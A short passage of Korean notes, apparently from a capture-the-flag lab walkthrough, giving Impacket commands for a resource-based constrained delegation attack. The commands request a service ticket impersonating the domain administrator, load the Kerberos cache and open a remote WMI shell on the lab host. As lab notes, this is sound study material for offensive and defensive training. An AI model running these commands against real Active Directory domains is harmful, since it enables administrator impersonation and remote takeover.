
- **목적:** 리소스 기반 제한된 위임(RBCD) 공격에서 특정 사용자를 사칭하는 서비스 티켓을 요청하는 데 사용됩니다.
- ---


```bash title="/etc/hosts 파일에 도메인 등록해줘야함"
echo "<DC IP 주소> thm.corp" | sudo tee -a /etc/hosts
echo "<HayStack 서버 IP 주소> HayStack.thm.corp" | sudo tee -a /etc/hosts

# EX
echo "10.201.64.40 thm.corp" | sudo tee -a /etc/hosts
echo "10.201.64.40 HayStack.thm.corp" | sudo tee -a /etc/hosts
```


```bash
impacket-getST -k -impersonate 'administrator' -spn 'cifs/haystack.thm.corp' 'thm.corp/darla_winters:Password123!'
```


```bash
# 생성된 캐시파일 환경변수에 등록
export KRB5CCNAME=~~~~~.ccache
```


```bash
rlwrap impacket-wmiexec -k -no-pass administrator@haystack.thm.corp
```

